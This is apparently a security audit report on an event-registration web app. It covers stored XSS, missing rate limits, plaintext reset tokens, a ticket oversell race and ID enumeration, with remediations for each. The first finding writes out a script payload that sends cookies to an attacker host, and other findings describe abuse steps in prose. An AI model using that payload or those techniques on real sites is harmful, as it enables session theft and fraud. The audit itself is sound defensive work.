EA-SYS Architecture Security Exploitation Findings
Date: 2026-02-16
Scope: Static architecture/code review of auth, public registration, and event rendering paths.

1) Stored XSS via Custom Footer HTML (High)
- Location:
  - Dashboard allows raw "footerHtml" input as branding configuration.
  - Public event and confirmation pages render footerHtml using dangerouslySetInnerHTML.
- Why exploitable:
  - Any user with event settings write access can inject arbitrary script payloads.
  - Payload executes in attendee/admin browser contexts where the HTML is rendered.
- Likely impact:
  - Session hijacking, credential theft, CSRF token theft, malicious redirects, defacement.
- Exploitation example:
  - Insert <script>fetch('https://attacker.tld/?c='+document.cookie)</script> in footer HTML.
  - When attendees load /e/[slug], script executes automatically.
- Recommended remediation:
  - Sanitize server-side HTML with a strict allowlist (e.g., DOMPurify + SSR-safe config).
  - Prefer markdown or a constrained rich-text format instead of arbitrary HTML.
  - Enforce CSP (disallow inline scripts; nonce/hash only).

2) No request throttling/rate limiting on sensitive public/auth routes (High)
- Location:
  - Forgot password, reset password, accept invitation, and public event registration endpoints.
- Why exploitable:
  - Endpoints can be abused for credential stuffing, token brute-force attempts, and email flooding.
  - Public registration endpoint can be automated for spam/DoS against events and mail provider quota.
- Likely impact:
  - Account takeover probability increases (especially with weak passwords elsewhere).
  - Operational disruption and increased email/API costs.
- Exploitation example:
  - Botnet submits thousands of forgot-password requests for known addresses.
  - Automated POSTs to public registration create large volumes of registrations.
- Recommended remediation:
  - Add per-IP + per-identifier rate limits with sliding windows.
  - Add CAPTCHA/Turnstile on high-risk unauthenticated endpoints.
  - Add abuse detection + temporary blocking and email send quotas.

3) Verification/invitation/reset tokens stored in plaintext in database (High)
- Location:
  - VerificationToken model stores token directly.
  - Token creation and lookup paths compare raw token values.
- Why exploitable:
  - If DB contents/logs/backups are exposed, attacker can directly use unexpired tokens.
  - Plaintext token storage increases blast radius of partial data leakage incidents.
- Likely impact:
  - Unauthorized password resets and invitation account activation.
- Exploitation example:
  - Attacker with read-only DB access queries unexpired VerificationToken rows and replays tokens.
- Recommended remediation:
  - Store only a salted hash of token (HMAC-SHA256 or SHA-256 with pepper).
  - Compare hashed incoming token values.
  - Shorten TTL and enforce one-time use + attempt counters.

4) Ticket oversell race condition in public registration flow (Medium)
- Location:
  - Availability check uses soldCount >= quantity before create.
  - soldCount increment happens later as a separate write.
- Why exploitable:
  - Concurrent requests can pass availability check before either increments soldCount.
  - Attackers can intentionally send parallel submissions to bypass inventory caps.
- Likely impact:
  - Overbooking, fraud/abuse of limited-capacity tickets, trust and operational issues.
- Exploitation example:
  - Send N parallel requests against remaining 1 ticket; multiple registrations succeed.
- Recommended remediation:
  - Use a single DB transaction with conditional update (WHERE soldCount < quantity).
  - Fail registration if update count is zero.
  - Consider row-level locks/serializable transaction where needed.

5) Public event lookup accepts both slug and raw event ID (Low)
- Location:
  - Public event endpoints search by OR: { slug } or { id: slug }.
- Why exploitable:
  - Enables easier event enumeration by ID pattern in addition to slug discovery.
  - Increases surface for scraping published/live event metadata.
- Likely impact:
  - Data exposure limited to already public events, but discoverability is amplified.
- Recommended remediation:
  - Restrict public lookup to slug only.
  - Keep event IDs internal and non-routable on public endpoints.

Prioritization:
- Immediate: #1, #2, #3
- Next sprint: #4
- Backlog hardening: #5
